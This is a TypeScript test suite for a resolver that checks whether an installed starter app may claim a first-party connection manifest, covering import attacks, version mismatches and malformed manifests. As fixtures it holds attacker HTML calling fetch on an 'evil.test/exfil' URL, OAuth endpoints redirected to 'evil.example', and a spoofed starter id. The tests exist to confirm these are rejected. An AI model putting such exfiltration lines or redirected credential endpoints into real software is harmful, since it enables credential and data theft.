// starterDeclaration.test.ts — TASK-20260807-connection-reachability, plan v2 §V2-2/V2-3/V2-7.
//
// The install-act declaration resolver: the ONE place that answers "did the user install
// an app that ships a first-party connection manifest?" for an app that has no chat and
// therefore can never reach the wizard through a directive.
//
// The whole design rests on the resolver refusing to be fooled. `install_source` is a
// plain column an attacker controls through a whole-DB import, so it can never be the
// sole key — the resolver additionally requires the app's PINNED FACTORY HTML to match
// the bundled starter's. Two independent facts, both first-party, or no declaration.
//
// Tests, per plan v2:
//   T2  — a genuinely-installed starter with a manifest resolves to its declaration
//   T2b — one changed byte in the stored HTML ⇒ null
//   T2c — imported-app simulation: starter install_source + foreign HTML ⇒ null
//   T2d — the comparison reads pinned version 1, never current_version
//   T2e — a malformed manifest ⇒ null + one console.warn, and nothing throws
//   T2f — normalized-equal HTML still resolves; a semantic edit does not, and REPORTS why

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import type { UserDb } from '@snugprotocol/db';

import {
  resolveDeclaredIntent,
  starterDeclarationFor,
  starterDeclarationForStarterId,
  __setDeclarationManifestsForTests,
  __resetDeclarationManifestsForTests,
} from '../starter/starterDeclaration.js';
import { loadStarterHtml, STARTER_PREFIX } from '../starter/starterApps.js';
import { installTestUserDb } from './userdbTestHelper.js';

/**
 * Pinned shared literals (task file §Shared literals v2).
 *
 * RE-POINTED (TASK-20260815-starter-apps-rebuild): `connection-demo` was removed in the
 * shelf re-curation; `weather` is the plain-api_key declarer that stands in for it. In
 * every suite below except the final real-glob one the folder is only a KEY into the
 * injected fixture map, so the manifest values stay the deliberate fixture values.
 */
const DEMO_FOLDER = 'weather';
const DEMO_SOURCE = `starter:${DEMO_FOLDER}`;
const DECLARED_HOST = 'api.example.com';

/**
 * The bundled starter HTML this suite pretends `examples/weather/app.html`
 * ships. The resolver reads the real glob in production; tests inject so the assertions
 * pin the RULE (both facts must hold) rather than the current bytes of a fixture file,
 * which would make every future edit to the demo app a red test here.
 */
const BUNDLED_HTML = '<!doctype html>\n<html>\n  <body>\n    <script>const app = 1;</script>\n  </body>\n</html>\n';

/**
 * MIGRATED TO v4 (TASK-20260810-p4-starters). This fixture was the v3 proposal shape
 * (`kindHint`/`providerName`), which `connectionRequirementSchema` now REJECTS by
 * construction — `strictObject` plus a required `slot`/`provider`/`kind`. The shape below
 * is the one the six shipped manifests carry, so this suite keeps testing the resolver
 * against the artifact that actually ships. Every assertion below is unchanged in
 * strength; only the seat names moved (`providerName` → `provider.name`).
 */
const VALID_MANIFEST = JSON.stringify({
  slot: 'example-api',
  provider: { name: 'Example API', docsUrl: 'https://docs.example.com/api' },
  kind: 'api_key',
  declaredApiHosts: [DECLARED_HOST],
});

let db: UserDb;

beforeEach(async () => {
  db = await installTestUserDb();
  __setDeclarationManifestsForTests({
    [DEMO_FOLDER]: { manifest: VALID_MANIFEST, html: BUNDLED_HTML },
  });
});

afterEach(() => {
  __resetDeclarationManifestsForTests();
  vi.restoreAllMocks();
});

/** Installs the demo the way the run view does: factory HTML, starter install_source. */
function installDemo(html: string = BUNDLED_HTML): string {
  return db.installApp({ displayName: 'connection demo', html, installSource: DEMO_SOURCE }).appId;
}

describe('T2 — a genuinely-installed starter resolves to its declaration', () => {
  it('returns the parsed, schema-valid requirement', async () => {
    const appId = installDemo();
    const result = await starterDeclarationFor(db, appId);

    expect(result, 'a first-party install with a manifest must declare').not.toBeNull();
    expect(result?.declaration.provider.name).toBe('Example API');
    expect(result?.declaration.declaredApiHosts).toEqual([DECLARED_HOST]);
  });

  it('returns null for an app with no manifest at all (most apps)', async () => {
    const appId = db.installApp({
      displayName: 'chess',
      html: '<html>chess</html>',
      installSource: 'starter:chess',
    }).appId;
    expect(await starterDeclarationFor(db, appId)).toBeNull();
  });

  it('returns null for an app with no install_source (a user-built app)', async () => {
    const appId = db.installApp({ displayName: 'mine', html: BUNDLED_HTML }).appId;
    expect(await starterDeclarationFor(db, appId), 'no source ⇒ no install act to trust').toBeNull();
  });

  it('returns null for an unknown app id rather than throwing', async () => {
    expect(await starterDeclarationFor(db, 'no-such-app')).toBeNull();
  });
});

describe('T2b — the stored HTML must match the bundled starter', () => {
  it('one changed byte in the stored HTML withdraws the declaration', async () => {
    // The single byte is the point: this is the whole-DB-import attack in miniature. If
    // the resolver trusted install_source alone, this app would declare.
    const appId = installDemo(BUNDLED_HTML.replace('const app = 1;', 'const app = 2;'));
    expect(await starterDeclarationFor(db, appId), 'edited HTML must not declare').toBeNull();
  });
});

describe('T2c — an imported app cannot borrow a starter’s declaration', () => {
  it('a starter install_source carrying foreign HTML resolves to null', async () => {
    const appId = installDemo('<html><script>fetch("https://evil.test/exfil")</script></html>');
    expect(await starterDeclarationFor(db, appId), 'attacker HTML must never declare').toBeNull();
  });

  it('the resolver does not fall back to install_source when the HTML is missing', async () => {
    const appId = installDemo();
    vi.spyOn(db, 'getAppHtml').mockReturnValue(undefined);
    expect(await starterDeclarationFor(db, appId), 'absent HTML is a mismatch, not a pass').toBeNull();
  });
});

describe('T2d — the comparison reads the PINNED factory version, never current_version', () => {
  it('a later version that does NOT match withdraws the declaration (BOTH versions must match)', async () => {
    // REVERSED by the Gate-4 implementation review (security lens, MAJOR, confirmed by an
    // independent refuter and reproduced by me at source). My original reasoning — "a user
    // edit does not retract the install act, so pinned v1 is the right key" — was WRONG,
    // and this test previously blessed the exact attack shape.
    //
    // The hole: `RunView` executes `current_version` (`library.ts` → `getAppHtml(id)` with
    // no version), while the resolver validated ONLY v1. A whole-DB import can therefore
    // supply v1 = the repo's real bytes (public, free to copy) + `install_source` =
    // 'starter:weather' + current_version = 2 = attacker code. Both facts held,
    // the declaration attached, and the sheet said "this app ships with a declared
    // connection" about code that shipped nothing. The credential brokering is keyed on
    // appId, so the ATTACKER's version is what any approval would have benefited.
    //
    // The claim Fact 2 exists to make is "the bytes came from this repo" — which is only
    // an inference about the RUNNING app if the compared bytes are the ones that run.
    const appId = installDemo();
    db.saveAppVersion(appId, '<html>my own edits</html>', 'user edit');

    expect(
      await starterDeclarationFor(db, appId),
      'the resolver must vouch for the code that RUNS, not archival bytes',
    ).toBeNull();
  });

  it('reports the mismatch when the running version diverges, rather than withdrawing silently', async () => {
    const appId = installDemo();
    db.saveAppVersion(appId, '<html>my own edits</html>', 'user edit');

    const outcome = await resolveDeclaredIntent(db, appId);
    expect(outcome.declaration).toBeUndefined();
    expect(outcome.mismatch, 'the user must be told why the guided setup vanished').toBe('html_mismatch');
  });

  it('an app still on its factory version (no later edits) declares normally', async () => {
    // The control — without it the fix above could be "always return null".
    const appId = installDemo();
    expect(await starterDeclarationFor(db, appId)).not.toBeNull();
  });

  it('reads version 1 explicitly — a doctored current version cannot mint a declaration', async () => {
    // The inverse attack: factory v1 is foreign, but the user's LATEST version happens to
    // match the bundle. A `current_version` comparison would declare here; reading the
    // pinned v1 must not.
    const appId = installDemo('<html>not the factory app</html>');
    db.saveAppVersion(appId, BUNDLED_HTML, 'looks legitimate now');

    expect(await starterDeclarationFor(db, appId), 'only the pinned factory version counts').toBeNull();
  });

  it('reads BOTH the pinned factory version and the running version', async () => {
    // Both reads are load-bearing and each closes a different hole (see the resolver's
    // comment): v1 alone lets an importer hide attacker code in current_version; current
    // alone lets an importer fake an install act that never happened.
    const appId = installDemo();
    const spy = vi.spyOn(db, 'getAppHtml');
    await starterDeclarationFor(db, appId);

    expect(spy, 'the pinned factory version').toHaveBeenCalledWith(appId, 1);
    expect(spy, 'the version that actually runs').toHaveBeenCalledWith(appId);
  });
});

describe('T2e — a malformed manifest is parsed-and-dropped, never a crash', () => {
  it('invalid JSON resolves to null and warns exactly once', async () => {
    __setDeclarationManifestsForTests({ [DEMO_FOLDER]: { manifest: '{ not json', html: BUNDLED_HTML } });
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const appId = installDemo();

    expect(await starterDeclarationFor(db, appId)).toBeNull();
    expect(warn, 'a malformed manifest must be reported, once').toHaveBeenCalledTimes(1);
  });

  it('a schema-invalid manifest resolves to null and warns', async () => {
    // Valid JSON, wrong shape: `slot`, `provider` and `kind` are required by
    // connectionRequirementSchema.
    __setDeclarationManifestsForTests({
      [DEMO_FOLDER]: { manifest: JSON.stringify({ declaredApiHosts: [DECLARED_HOST] }), html: BUNDLED_HTML },
    });
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const appId = installDemo();

    expect(await starterDeclarationFor(db, appId)).toBeNull();
    expect(warn).toHaveBeenCalledTimes(1);
  });

  it('a manifest carrying an UNKNOWN key is rejected, not silently accepted', async () => {
    // `connectionRequirementSchema` is `strictObject` at every level, so an unknown key
    // anywhere is a rejection rather than a passthrough. The rule this preserves from v3
    // is unchanged: the resolver must not be the one place that relaxes the manifest
    // contract, or a future app-import channel would inherit that hole.
    __setDeclarationManifestsForTests({
      [DEMO_FOLDER]: {
        manifest: JSON.stringify({
          slot: 'example-api',
          provider: { name: 'Example API' },
          kind: 'api_key',
          declaredApiHosts: [DECLARED_HOST],
          registrationInstructions: ['click here to get owned'],
        }),
        html: BUNDLED_HTML,
      },
    });
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    const appId = installDemo();

    expect(await starterDeclarationFor(db, appId), 'unknown keys are a strict rejection').toBeNull();
  });

  it('a manifest authoring a `userLayer` is REFUSED by admission (the v4 successor guard)', async () => {
    // v3 defended the credential-prompt seats by OMITTING them from the schema. v4
    // re-admits them and pays for it at admission instead, so the guard that matters here
    // is the channel one: `userLayer` is registry-synthesized ONLY, and a starter
    // declaring one would aim the three-legged consent flow at endpoints it chose.
    // Schema-valid on purpose — this must be refused by ADMISSION, not by the parser.
    __setDeclarationManifestsForTests({
      [DEMO_FOLDER]: {
        manifest: JSON.stringify({
          slot: 'example-api',
          provider: { name: 'Example API' },
          kind: 'api_key',
          declaredApiHosts: [DECLARED_HOST],
          userLayer: {
            kind: 'oauth2_auth_code',
            endpoints: {
              authorizeUrl: 'https://evil.example/authorize',
              tokenUrl: 'https://evil.example/token',
            },
            declaredApiHosts: ['evil.example'],
          },
        }),
        html: BUNDLED_HTML,
      },
    });
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    const appId = installDemo();

    expect(
      await starterDeclarationFor(db, appId),
      'the starter channel may not author a userLayer',
    ).toBeNull();
  });
});

describe('T2f — normalized comparison, and a mismatch REPORTS its reason', () => {
  it('line-ending and trailing-whitespace differences still resolve', async () => {
    // The silent-withdrawal failure mode (fidelity check C1): a checkout with CRLF line
    // endings, or a formatter touching trailing space, must not strand the user in the
    // empty wizard this task exists to eliminate.
    // CRLF line endings, trailing spaces at end of lines, and a trailing newline — the
    // three things a checkout, a formatter or an editor changes without touching code.
    const crlf = `${BUNDLED_HTML.replace(/\n/g, '  \r\n')}\r\n\r\n`;
    const appId = installDemo(crlf);

    expect(await starterDeclarationFor(db, appId), 'whitespace-only drift must still declare').not.toBeNull();
  });

  it('an INDENTATION change is not forgiven — normalization is narrow by design', async () => {
    // Pins the limit of the previous test. Leading whitespace is inside the line, so it
    // survives normalization and reads as an edit. Widening `normalize()` to collapse all
    // whitespace would make the byte-match far weaker than V2-2 requires, and this test
    // is what fails if someone later reaches for `.replace(/\s+/g, ' ')`.
    const appId = installDemo(BUNDLED_HTML.replace('  <body>', '        <body>'));

    expect(await starterDeclarationFor(db, appId)).toBeNull();
  });

  // NOTE (P4, TASK-20260812-desktop-auth-awareness): these two cases used to name a
  // "Settings surface" as the consumer of `mismatch`. NO SUCH SURFACE EXISTS — a
  // `console.warn` at the detection site is the only signal a user could see. The
  // ASSERTIONS are unchanged and still binding (the seat must be set, and must NOT be set
  // for an app that simply never declared); only the false claim about who renders it is
  // corrected. Building the surface is queued in docs/next-steps.md.
  it('a semantic edit does not resolve, and the mismatch is REPORTED rather than silent', async () => {
    const appId = installDemo(BUNDLED_HTML.replace('const app = 1;', 'const app = 999;'));
    const outcome = await resolveDeclaredIntent(db, appId);

    expect(outcome.declaration, 'a semantic edit must withdraw').toBeUndefined();
    expect(outcome.mismatch, 'withdrawal must be explainable, never silent').toBe('html_mismatch');
  });

  it('the happy path reports no mismatch', async () => {
    const appId = installDemo();
    const outcome = await resolveDeclaredIntent(db, appId);

    expect(outcome.declaration).toBeDefined();
    expect(outcome.mismatch).toBeUndefined();
  });

  it('an app with no manifest reports no mismatch either — it simply never declared', async () => {
    // The distinction a future surface will depend on: "this app’s code no longer matches
    // its starter" is a WARNING, while "this app has no connection" is the normal case.
    // Collapsing them would put a scary banner on every app in the library.
    const appId = db.installApp({ displayName: 'chess', html: '<html>chess</html>', installSource: 'starter:chess' })
      .appId;
    const outcome = await resolveDeclaredIntent(db, appId);

    expect(outcome.declaration).toBeUndefined();
    expect(outcome.mismatch, 'no manifest is not a mismatch').toBeUndefined();
  });
});

describe('the resolver applies the REGISTRY-BORROW BAN, and enriches nothing else', () => {
  /**
   * THE POSTURE INVERTED DELIBERATELY IN v4, and this pair of tests records both halves.
   *
   * v3's rule was "the resolver never consults the registry": enriching at install time
   * would hand an app the registry's authority before the user ever looked. That reasoning
   * still holds for ENRICHMENT — and it is asserted by the second test below, unchanged in
   * force.
   *
   * What changed is that consulting the registry is now how the BORROW BAN works
   * (P0, fold S-M3). A manifest naming a registry provider no longer keeps its own
   * declared values: the registry's pinned host list REPLACES them. That is not
   * enrichment, it is substitution in the opposite direction — the manifest cannot trade
   * on a brand while pointing the credential somewhere else. Asserting the old "verbatim"
   * behavior for a registry name would now be asserting that the ban does not fire.
   */
  it('SUBSTITUTES pinned values when the manifest names a registry provider', async () => {
    __setDeclarationManifestsForTests({
      [DEMO_FOLDER]: {
        manifest: JSON.stringify({
          slot: 'github',
          provider: { name: 'github' },
          kind: 'bearer_token',
          declaredApiHosts: [DECLARED_HOST],
        }),
        html: BUNDLED_HTML,
      },
    });
    const appId = installDemo();
    const result = await starterDeclarationFor(db, appId);

    // The registry's display name and hosts win; the manifest's declared host is GONE,
    // not merged — a merge would let a starter keep an attacker host beside a real one.
    expect(result?.declaration.provider.name).toBe('GitHub');
    expect(result?.declaration.declaredApiHosts).toEqual(['api.github.com']);
    expect(result?.declaration.declaredApiHosts).not.toContain(DECLARED_HOST);
  });

  it('leaves a NON-registry provider completely unenriched', async () => {
    // The surviving half of the v3 posture, and the one that still guards install-time
    // authority: an unknown provider is passed through verbatim. Nothing is spliced in,
    // no endpoints appear, and the wizard applies the registry later under the user's
    // eyes in the strong review.
    const appId = installDemo();
    const result = await starterDeclarationFor(db, appId);

    expect(result?.declaration.provider.name).toBe('Example API');
    expect(result?.declaration.declaredApiHosts, 'declared hosts survive verbatim').toEqual([DECLARED_HOST]);
    expect(result?.declaration.endpoints, 'no registry endpoints may be spliced in').toBeUndefined();
    expect(result?.declaration.registration, 'no registration copy may be spliced in').toBeUndefined();
  });
});

describe('the PRE-INSTALL lookup — what the run view discloses before anything is owned', () => {
  it('reports the declaration for a starter the user has not installed', async () => {
    // The install disclosure (§V2-6) runs on the READ-ONLY starter route, where there is
    // no app row and no stored HTML — so it cannot use the two-fact resolver. This is a
    // deliberately weaker lookup for a deliberately weaker claim: "this starter ships a
    // declared connection", made about BUNDLED bytes the user has not yet copied.
    const declaration = await starterDeclarationForStarterId(`starter--${DEMO_FOLDER}`);

    expect(declaration?.provider.name).toBe('Example API');
    expect(declaration?.declaredApiHosts).toEqual([DECLARED_HOST]);
  });

  it('returns null for a starter that ships no manifest', async () => {
    expect(await starterDeclarationForStarterId('starter--chess')).toBeNull();
  });

  it('returns null for an id that is not a starter id at all', async () => {
    // An installed app's uuid must never resolve here — that path has to go through the
    // two-fact resolver, or the HTML check could be bypassed by asking the wrong question.
    expect(await starterDeclarationForStarterId('9f3a1c22-0000-4000-8000-000000000000')).toBeNull();
  });

  it('the prefix guard really guards — an id whose SLICE would hit a real folder must not resolve', async () => {
    // Found by mutation M22, and it took two attempts to write a test that can actually
    // fail for the reason it names.
    //
    // Attempt 1 passed a bare folder name — useless, because without the guard
    // `'weather'.slice(9)` is `''`, which matches nothing, so the function
    // returns null either way. The guard was never exercised and the test proved nothing.
    //
    // The discriminating input has to be one where the UNGUARDED `slice()` lands exactly
    // on a real folder. `STARTER_PREFIX` is 9 chars, so a 9-char prefix followed by the
    // folder name does it: with the guard this is refused outright; without it, the slice
    // yields `weather` and the function would answer for an id it has no
    // authority over. That is the whole point of the guard — an installed app's id must
    // go through the two-fact resolver, never this weaker lookup.
    const spoofed = `..:.:.:.:${DEMO_FOLDER}`;
    expect(spoofed.slice(9), 'the fixture must actually reach a real folder when unguarded').toBe(DEMO_FOLDER);

    expect(await starterDeclarationForStarterId(spoofed), 'only prefixed starter ids may resolve').toBeNull();
  });

  it('drops a malformed manifest exactly like the installed path', async () => {
    __setDeclarationManifestsForTests({ [DEMO_FOLDER]: { manifest: '{ nope', html: BUNDLED_HTML } });
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});

    expect(await starterDeclarationForStarterId(`starter--${DEMO_FOLDER}`)).toBeNull();
    expect(warn).toHaveBeenCalledTimes(1);
  });
});

describe('the REAL production glob — no fixtures injected (Gate-4 review, MAJOR)', () => {
  // Found by the Gate-4 implementation review's test lens, confirmed by an independent
  // refuter and reproduced here: EVERY other suite in this file injects
  // `__setDeclarationManifestsForTests`, and `bundled()` short-circuits on that seam
  // BEFORE it ever touches `import.meta.glob`. So the production wiring — the two glob
  // patterns and `folderOf`'s regex — was executed by no committed test at all.
  //
  // The verifier mutated the manifest glob to a misspelled pattern and all 477 playground
  // tests stayed GREEN. Concretely that ships a build where the declaring starter resolves
  // to nothing for every user: no install disclosure, an empty wizard behind the CTA, no
  // Settings row — the exact gap this whole task exists to close, silently reopened.
  //
  // These tests deliberately run WITHOUT the fixture seam, against the real bundled files.
  //
  // RE-POINTED at `trade-copilot` (TASK-20260815-starter-apps-rebuild): connection-demo
  // is gone, and trade-copilot is the declaring starter whose app.html + connection.json
  // both ship today. Its manifest names the registry-pinned Coinbase brand, so the values
  // asserted here are the POST-SUBSTITUTION ones — the registry's pinned host list.
  const REAL_FOLDER = 'trade-copilot';
  /** `examples/trade-copilot/connection.json` after registry substitution (Coinbase). */
  const REAL_DECLARED_HOSTS = ['api.coinbase.com'];

  beforeEach(() => {
    __resetDeclarationManifestsForTests();
  });

  it(`resolves the real examples/${REAL_FOLDER} manifest through the real glob`, async () => {
    const factory = await loadStarterHtml(`${STARTER_PREFIX}${REAL_FOLDER}`);
    expect(factory, 'the app.html glob must find the starter').toBeDefined();

    const appId = db.installApp({
      displayName: 'trade copilot',
      html: factory!,
      installSource: `starter:${REAL_FOLDER}`,
    }).appId;

    const result = await starterDeclarationFor(db, appId);
    expect(result, 'the production glob + folderOf + parse chain must actually work').not.toBeNull();
    expect(result?.declaration.declaredApiHosts).toEqual(REAL_DECLARED_HOSTS);
  });

  it('resolves the real manifest through the PRE-INSTALL lookup too', async () => {
    const declaration = await starterDeclarationForStarterId(`${STARTER_PREFIX}${REAL_FOLDER}`);
    expect(declaration?.declaredApiHosts).toEqual(REAL_DECLARED_HOSTS);
  });

  it('a real starter that ships NO manifest resolves to null through the real glob', async () => {
    // Pins `folderOf` discrimination: with a broken folder regex every folder would look
    // like the same folder, and chess would wrongly inherit the demo's manifest.
    expect(await starterDeclarationForStarterId(`${STARTER_PREFIX}chess`)).toBeNull();
  });
});
